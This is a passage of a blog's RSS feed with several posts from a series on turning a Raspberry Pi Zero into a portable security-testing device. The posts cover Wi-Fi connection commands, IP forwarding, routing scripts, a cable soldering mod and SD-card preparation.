+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/">HackOTG (v1.3): Creating our own hotspot on boot</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">889</post-id>	</item>
+		<item>
+		<title>HackOTG (v1.2): Basic connectivity to the internet</title>
+		<link>https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/</link>
+		<comments>https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/#comments</comments>
+		<pubDate>Wed, 11 Oct 2017 00:16:02 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[bash]]></category>
+		<category><![CDATA[command-line]]></category>
+		<category><![CDATA[embedded system]]></category>
+		<category><![CDATA[hacking]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[operating system]]></category>
+		<category><![CDATA[os]]></category>
+		<category><![CDATA[proxy]]></category>
+		<category><![CDATA[raspbian]]></category>
+		<category><![CDATA[rpi]]></category>
+		<category><![CDATA[rpi zero]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[terminal]]></category>
+		<category><![CDATA[tunneling]]></category>
+		<category><![CDATA[wifi]]></category>
+		<category><![CDATA[wifi wireless]]></category>
+		<category><![CDATA[wireless]]></category>
+
+		<guid isPermaLink="false">https://demgeeks.com/?p=876</guid>
+		<description><![CDATA[<p>This article is part of a series: you can find the first article here. If you missed the previous one, it is here. After the previous article, we can plug-in our HackOTG and log in with SSH over the emulated Ethernet-adapter. Now, we don&#8217;t have internet-connectivity yet&#8230; Sometimes we will want to have an internet-connection [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/">HackOTG (v1.2): Basic connectivity to the internet</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p><em>This article is part of a series: <a href="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/">you can find the first article here</a>. If you missed the previous one, <a href="https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/">it is here</a>.</em></p>
+<p>After the previous article, we can plug-in our HackOTG and log in with SSH over the emulated Ethernet-adapter. Now, we don&#8217;t have internet-connectivity yet&#8230; Sometimes we will want to have an internet-connection to install new packages, backup our device or have a new way to connect to our device. In this article we will go through the basics of networking on your HackOTG.</p>
+<h2>Setting up the interface and scan</h2>
+<p>Log in to your HackOTG over the emulated Ethernet device:</p>
+<pre>ifconfig usb0 192.168.7.3
+ssh pi@192.168.7.2 #password is "raspberry"</pre>
+<p><strong>Activate your Wifi-interface:</strong></p>
+<pre>sudo ifconfig wlan0 up</pre>
+<p><strong>Scan for available Wifi-Hotspots:</strong></p>
+<pre>sudo iwlist wlan0 scan | less</pre>
+<h2>Associate with the access point</h2>
+<p>There are a couple different security mechanisms, in the previous performed scan you&#8217;ll find which one your chosen hotspot uses.</p>
+<h3>WEP</h3>
+<p>This is one of the <a href="https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy">oldest security mechanisms</a>, which has many flaws but this is how you connect: (replace &#8220;testessid&#8221; and &#8220;safestpasswordever&#8221;)</p>
+<pre>sudo iwconfig wlan0 essid testessid key s:safestpasswordever</pre>
+<h3>WPA</h3>
+<p>A common security mechanism is <a href="https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access">WPA</a>. WPA has many flavours but most of them will be accesible with the following steps.</p>
+<p><strong>Create a config-file: </strong>(replace &#8220;MYSSID&#8221; and &#8220;passphrase&#8221;)</p>
+<pre>wpa_passphrase <em>MYSSID passphrase</em> &gt; <em>MYSSID</em>.conf</pre>
+<p>This will create a config-file with a hashed passphrase (for security reasons). If it is a public (unsecured) WiFi, you can create the same file with these contents.</p>
+<pre>network={
+ ssid="MYSSID"
+ key_mgmt=NONE
+ }</pre>
+<p><strong>To connect:</strong> <em>(replace &#8220;interface&#8221; and &#8220;MYSSID&#8221;)</em></p>
+<pre>sudo wpa_supplicant -B -i <i>interface</i> -D wext -c <em>MYSSID</em>.conf</pre>
+<p>The driver &#8220;wext&#8221; can be changed out for other drivers found in the &#8220;wpa_supplicant -h&#8221; command. With the built-in wifi on the Pi zero, you can use &#8220;wext&#8221;. The &#8220;&amp;&#8221; at the end of the command will run it in the background.</p>
+<h2>Requesting an IP</h2>
+<p>Now that we are assosiated and authenticated, we need an IP, We can get it from the DHCP server running on the router with this command:</p>
+<pre>sudo dhcpcd --nohook wpa_supplicant wlan0</pre>
+<h2>Automate the process</h2>
+<p>You can write a bash script, so you can connect to a wifi-hotspot with one command. You can make multiple scripts and config-files to connect to different hotspots.</p>
+<pre>sh connect_wifi_ssid.sh</pre>
+<p><strong>connect_wifi_ssid.sh:</strong></p>
+<pre>sudo wpa_supplicant -B -i wlan0 -D wext -c ssid.conf
+sudo dhcpcd --nohook wpa_supplicant wlan0</pre>
+<p>It is a good idea to make a <strong>connect_wifi_HELP.txt,</strong> that contains the wep and wpa_passphrase command and some guidelines to connect to WEP and WAP (so you don&#8217;t need this article).</p>
+<p><strong>connect_wifi_HELP.sh:</strong></p>
+<pre>##SCANNING
+sudo iwlist wlan0 scan
+##WEP
+sudo iwconfig wlan0 essid testessid key s:safestpasswordever
+##WPA 
+wpa_passphrase <em>MYSSID passphrase</em> &gt; <em>MYSSID</em>.conf 
+sudo wpa_supplicant -B -i wlan0 -D wext -c MYSSID.conf
+sudo dhcpcd --nohook wpa_supplicant wlan0
+#unsecured? change the conf file to: 
+network={ 
+ ssid="MYSSID"
+ key_mgmt=NONE 
+}</pre>
+<h2>Forwarding the connection</h2>
+<p>You can forward the connectivity of your HackOTG through your emulated Ethernet device by simply enabling ipv4-forwarding with this command:</p>
+<pre>sudo sh -c "echo 1 &gt; /proc/sys/net/ipv4/ip_forward"</pre>
+<p>This can be handy if you need to register or fill in a form in a captive portal. Or if you just need a WiFi-connection.</p>
+<h2>Checking the internet connection</h2>
+<p>You will have 2 active interfaces now. By performing the <em>&#8220;route -n&#8221;</em> command, you can see the way your traffic is going to be handled. Sometimes you will want to choose the connection to use for you internet connectivity. You can do that with these scripts:</p>
+<p><strong>route_wlan0.sh:</strong> (to direct all traffic through the WiFi-connection)</p>
+<pre>sudo route del default
+sudo dhcpcd -n wlan0</pre>
+<p><strong>route_usb0.sh:</strong> (to direct all traffic the emulated ethernet connection)</p>
+<pre>sudo route del default
+sudo dhcpcd -n usb0</pre>
+<p>Remember, if you dont&#8217;t have connectivity to the internet, check if the proper interface is on the first line in the output of the <em>&#8220;route -n&#8221;</em> command. But now that we have connectivity, we can update all our software with the following commands:</p>
+<pre>sudo apt-get update
+sudo apt-get upgrade
+sudo apt-get dist-upgrade</pre>
+<p>Great, we can connect to wifi-hotspots now, which we can not only use for an internet connection but if you know the IP (use &#8216;ifconfig&#8217;) you can connect to it over wifi.<br />
+Next, we will setup our own WiFi-hotspot, so we don&#8217;t have to configure a WiFi-hotspot over the emulated Ethernet-device if we want to SSH to the device over WiFi.</p>
+<p><em>You can find the next one here:</em></p>
+<blockquote class="wp-embedded-content" data-secret="tVHiU01lqM"><p><a href="https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/">HackOTG (v1.3): Creating our own hotspot on boot</a></p></blockquote>
+<p><iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" src="https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/embed/#?secret=tVHiU01lqM" data-secret="tVHiU01lqM" width="600" height="338" title="&#8220;HackOTG (v1.3): Creating our own hotspot on boot&#8221; &#8212; Dem Geeks" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/">HackOTG (v1.2): Basic connectivity to the internet</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/feed/</wfw:commentRss>
+		<slash:comments>3</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">876</post-id>	</item>
+		<item>
+		<title>HackOTG (v1.1): Integrating the cable for more portability</title>
+		<link>https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/</link>
+		<comments>https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/#comments</comments>
+		<pubDate>Tue, 10 Oct 2017 20:13:42 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[android]]></category>
+		<category><![CDATA[badusb]]></category>
+		<category><![CDATA[bluetooth]]></category>
+		<category><![CDATA[embedded system]]></category>
+		<category><![CDATA[ethernet]]></category>
+		<category><![CDATA[hid]]></category>
+		<category><![CDATA[kernel]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[microusb]]></category>
+		<category><![CDATA[modules]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[operating system]]></category>
+		<category><![CDATA[os]]></category>
+		<category><![CDATA[OTG]]></category>
+		<category><![CDATA[raspbian]]></category>
+		<category><![CDATA[rpi]]></category>
+		<category><![CDATA[rpi zero]]></category>
+		<category><![CDATA[sd]]></category>
+		<category><![CDATA[usb]]></category>
+		<category><![CDATA[wifi]]></category>
+		<category><![CDATA[wifi wireless]]></category>
+
+		<guid isPermaLink="false">https://demgeeks.com/?p=858</guid>
+		<description><![CDATA[<p>This article is part of a series: you can find the first article here. Before we start using our device, we have to make sure it is a good form-factor for our purpose and at this point, we will always need a USB-cable attached to the device, to be able to interface with it. In [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/">HackOTG (v1.1): Integrating the cable for more portability</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p><em>This article is part of a series: <a href="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/">you can find the first article here</a>.</em></p>
+<p>Before we start using our device, we have to make sure it is a good form-factor for our purpose and at this point, we will always need a USB-cable attached to the device, to be able to interface with it. In the future we will sometimes want to connect with WiFi so we can use the same connection to emulate different devices for our physical attacks.</p>
+<p>No matter what, we will need the cable attached to it, be it for power, connectivity or attack. There are handy connections on the bottom of the Pi zero to make the following process easier. If you don&#8217;t want to perform this mod, you don&#8217;t need to, but it is very handy and makes the whole platform more compact and portable.</p>
+<h2>What do you need?</h2>
+<ul>
+<li>Soldering iron, solder and tweezers (small wires)</li>
+<li>Pi zero</li>
+<li>Spare USB-cable</li>
+<li>Small zip tie</li>
+<li>Knife</li>
+<li>Pliers</li>
+<li>Glue</li>
+</ul>
+<h2>Putting it all together</h2>
+<p><img data-attachment-id="871" data-permalink="https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/wp-image-1821625988-jpg/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?fit=2585%2C2197&amp;ssl=1" data-orig-size="2585,2197" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="wp-image-1821625988.jpg" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?fit=300%2C255&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?fit=640%2C544&amp;ssl=1" class="alignnone wp-image-871 size-full" src="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?resize=640%2C544&#038;ssl=1" alt="" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?w=2585&amp;ssl=1 2585w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?resize=300%2C255&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?resize=768%2C653&amp;ssl=1 768w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?resize=1024%2C870&amp;ssl=1 1024w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?resize=640%2C544&amp;ssl=1 640w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?w=1280&amp;ssl=1 1280w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-1821625988.jpg?w=1920&amp;ssl=1 1920w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>No surprises here, snip of the USB-A side, strip the cable from the black plastic layer, and you&#8217;ll find a metallic shielding layer with 4 cables in it (white, green, red, black). Those are 2 data-cables and 2 for power. If you make 2 small indentations on both sides of the USB-port, you can tie a cable-tie around it and through the holes. Pull the cable-tie very tight (use pliers) and it wont move anymore.<br />
+Solder the cables to the pads with respective indicated color on the image below. The cables can be as short as 5cm. You can drop a bit of glue onto the wires to insulate them form each other again.</p>
+<p><img data-attachment-id="867" data-permalink="https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/screenshot-2017-10-10-at-21-54-32/" data-orig-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-21.54.32.png?fit=695%2C333&amp;ssl=1" data-orig-size="695,333" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2017-10-10 at 21.54.32" data-image-description="" data-medium-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-21.54.32.png?fit=300%2C144&amp;ssl=1" data-large-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-21.54.32.png?fit=640%2C307&amp;ssl=1" class="alignnone wp-image-867 size-full" src="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-21.54.32.png?resize=640%2C307&#038;ssl=1" alt="" srcset="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-21.54.32.png?w=695&amp;ssl=1 695w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-21.54.32.png?resize=300%2C144&amp;ssl=1 300w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-21.54.32.png?resize=640%2C307&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<h2>The result and what&#8217;s next?</h2>
+<p>Now you don&#8217;t have to carry a USB-cable together with the Pi, it is already integrated in the device! If you plug it straight into a power source (battery, wall-socket, &#8230;) it will boot. And if the device is also a USB-host, it will present itself as an Ethernet-to-USB adapter and we can SSH into it to perform our work. Now we can start using our HackOTG everywhere!</p>
+<p><img data-attachment-id="864" data-permalink="https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/wp-image-143906911-jpg/" data-orig-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?fit=1765%2C1324&amp;ssl=1" data-orig-size="1765,1324" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="wp-image-143906911.jpg" data-image-description="" data-medium-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?fit=300%2C225&amp;ssl=1" data-large-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?fit=640%2C480&amp;ssl=1" class="alignnone wp-image-864 size-full" src="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?resize=640%2C480&#038;ssl=1" alt="" srcset="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?w=1765&amp;ssl=1 1765w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?resize=300%2C225&amp;ssl=1 300w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?resize=768%2C576&amp;ssl=1 768w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?resize=1024%2C768&amp;ssl=1 1024w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?resize=80%2C60&amp;ssl=1 80w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?resize=245%2C184&amp;ssl=1 245w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?resize=260%2C195&amp;ssl=1 260w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?resize=640%2C480&amp;ssl=1 640w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/wp-image-143906911.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p><em>You can find the next one here:</em></p>
+<blockquote class="wp-embedded-content" data-secret="zjGS1XMwjZ"><p><a href="https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/">HackOTG (v1.2): Basic connectivity to the internet</a></p></blockquote>
+<p><iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" src="https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/embed/#?secret=zjGS1XMwjZ" data-secret="zjGS1XMwjZ" width="600" height="338" title="&#8220;HackOTG (v1.2): Basic connectivity to the internet&#8221; &#8212; Dem Geeks" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/">HackOTG (v1.1): Integrating the cable for more portability</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">858</post-id>	</item>
+		<item>
+		<title>HackOTG (v1.0): A universal, portable, security-platform</title>
+		<link>https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/</link>
+		<comments>https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/#comments</comments>
+		<pubDate>Sat, 07 Oct 2017 15:55:14 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[android]]></category>
+		<category><![CDATA[badusb]]></category>
+		<category><![CDATA[bluetooth]]></category>
+		<category><![CDATA[embedded system]]></category>
+		<category><![CDATA[ethernet]]></category>
+		<category><![CDATA[hid]]></category>
+		<category><![CDATA[kernel]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[microusb]]></category>
+		<category><![CDATA[modules]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[operating system]]></category>
+		<category><![CDATA[os]]></category>
+		<category><![CDATA[OTG]]></category>
+		<category><![CDATA[raspbian]]></category>
+		<category><![CDATA[rpi]]></category>
+		<category><![CDATA[rpi zero]]></category>
+		<category><![CDATA[sd]]></category>
+		<category><![CDATA[usb]]></category>
+		<category><![CDATA[wifi]]></category>
+		<category><![CDATA[wireless]]></category>
+
+		<guid isPermaLink="false">https://demgeeks.com/?p=821</guid>
+		<description><![CDATA[<p>When demonstrating a possible attack vector to a friend or a client, you want something standalone that is not influenced by your day-to-day tasks. Many have a persistent Kali Linux on a bootable USB-drive exactly for this purpose. There are also many attack-vectors which require physical devices. Exploits like DNS-tunneling, HID-attacks and BadUSB are only a couple of examples. [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/">HackOTG (v1.0): A universal, portable, security-platform</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p>When demonstrating a possible attack vector to a friend or a client, you want something standalone that is not influenced by your day-to-day tasks. Many have a persistent <a href="https://www.kali.org/">Kali Linux</a> on a <a href="https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/">bootable USB-drive</a> exactly for this purpose. There are also many attack-vectors which require physical devices. Exploits like <a href="https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/">DNS-tunneling</a>, HID-attacks and <a href="https://www.topsec.com/it-security-news-and-info/what-is-badusb-and-should-i-be-scared">BadUSB</a> are only a couple of examples.</p>
+<p>You can buy specific devices like the <a href="https://hakshop.com/products/usb-rubber-ducky-deluxe">USB rubber ducky</a> to perform these attacks in an easy, portable, quick way. Apart from being quite costly, you can&#8217;t carry them all in your everyday backpack and they often require to be reprogrammed for a different attack on the same vector&#8230; So having multiple will only make it worse.</p>
+<p>I&#8217;ve ported a lot of my physical exploits and some wifi-exploits to my Android device. It&#8217;s disguised, a all-in-one and you&#8217;ll always have it on you. An OTG-cable in my backpack and I&#8217;m ready to go&#8230; But often a lot of these exploits require a custom kernel or some modules to be able to function. Many tweaks are also device specific. When there is an update, a lot of unexpected things can happen. Not the best solution.</p>
+<p>So I was searching something open-source, portable, inexpensive, expendable, easy-to-mod and easy to interface with and change it behavior and I found this:</p>
+<p><img data-attachment-id="848" data-permalink="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/screenshot-2017-10-10-at-10-57-52/" data-orig-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-10.57.52-e1507627804407.png?fit=889%2C441&amp;ssl=1" data-orig-size="889,441" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2017-10-10 at 10.57.52" data-image-description="" data-medium-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-10.57.52-e1507627804407.png?fit=300%2C149&amp;ssl=1" data-large-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-10.57.52-e1507627804407.png?fit=640%2C317&amp;ssl=1" class="alignnone wp-image-848 size-full" src="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-10.57.52-e1507627804407.png?resize=640%2C317&#038;ssl=1" alt="" srcset="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-10.57.52-e1507627804407.png?w=889&amp;ssl=1 889w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-10.57.52-e1507627804407.png?resize=300%2C149&amp;ssl=1 300w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-10.57.52-e1507627804407.png?resize=768%2C381&amp;ssl=1 768w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-10.57.52-e1507627804407.png?resize=640%2C317&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>It is essentially a small stand-alone computer, running Linux of an SD-card. What is cool about this model is, that it has WiFi and Bluetooth and a board-setup configured to support USB-gadget or OTG mode. Which can change one of the micro-USB ports in whatever USB-device that you want (HID, Ethernet Dongle, Mass-storage, MIDI, &#8230; ). It is powered with a normal 5v micro-USB cable plugged in a USB-device or wall-adapter.</p>
+<p>We can set it up as a headless device that we can ssh into over a WiFi-signal or even easier, making it emulate an ethernet device. The rest of this article will describe how to get it to emulate an Ethernet to USB controller and SSH&#8217;ing into it without ever attaching a display.</p>
+<h2>Preparing the SD-card</h2>
+<p>The software that is best adapted to the hardware is <a href="https://www.raspberrypi.org/documentation/raspbian/">Raspbian</a>. You can try to do the same steps on other ARM OS-distro&#8217;s, but from my experience they lack a lot of support for OTG. The idea is to make a very-easy-to-recreate setup so if it is not your favourite flavour of linux, no worries.</p>
+<p>There are <a href="https://www.raspberrypi.org/documentation/installation/installing-images/">many ways to install Raspbian</a>, but you basically download the <a href="https://en.wikipedia.org/wiki/Disk_image">diskimage</a> and write it to the SD-card. if your SD-card is bigger than the original disk-image, expand the partition to its full size. In this article you&#8217;ll find a guide how to do this on Linux.<br />
+A SD-card in a raspberry pi consists of 1 small FAT-partition with boot files and 1 large EXT4-partition. Recreating the partition table and copying the right files on each will also give you a working system (but Raspbian gives you a ready disk-image).</p>
+<p><strong>Download the Raspbian Lite-image:</strong> (You don&#8217;t need te full one)</p>
+<p><img data-attachment-id="854" data-permalink="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/screenshot-2017-10-10-at-13-10-42/" data-orig-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-13.10.42.png?fit=425%2C232&amp;ssl=1" data-orig-size="425,232" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2017-10-10 at 13.10.42" data-image-description="" data-medium-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-13.10.42.png?fit=300%2C164&amp;ssl=1" data-large-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-13.10.42.png?fit=425%2C232&amp;ssl=1" class="alignnone wp-image-854 size-full" src="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-13.10.42.png?resize=425%2C232&#038;ssl=1" alt="" srcset="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-13.10.42.png?w=425&amp;ssl=1 425w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-10-at-13.10.42.png?resize=300%2C164&amp;ssl=1 300w" sizes="(max-width: 425px) 100vw, 425px" data-recalc-dims="1" /></p>
+<pre>wget https://downloads.raspberrypi.org/raspbian_lite_latest
+unzip raspbian_lite_latest #will unzip an .img file</pre>
+<p><strong>Flash your SD-card:</strong></p>
+<p>Plug your SD-card in your pc with an card-reader. Your SD-card size and type matter, but are not that important. You want a fast one (indicated by its class, 10 is best) and anything above 2 gb will work well if using the lite-image. If you deploy this somewhere and it has to record or log something, make sure that it has disk-space to do so. At the time of writing a  quality SD-card of 32 gb is 20 EUR, so that would bring the total cost to ~30 EUR excluding cables (which you probably have too much of).<br />
+<span style="text-decoration: underline;">Double-check before running these commands!</span></p>
+<pre>fdisk -l #lookup the device name of your SD-card (ex. /dev/mmcblk1)</pre>
+<pre class="output">Disk <strong>/dev/mmcblk1</strong>: 29.8 GiB, 32026656768 bytes, 62552064 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x00000000
+
+Device    Boot Start End      Sectors  Size  Id Type
+/dev/mmcblk1p1 8192  62552063 62543872 29.8G c  W95 FAT32 (LBA)</pre>
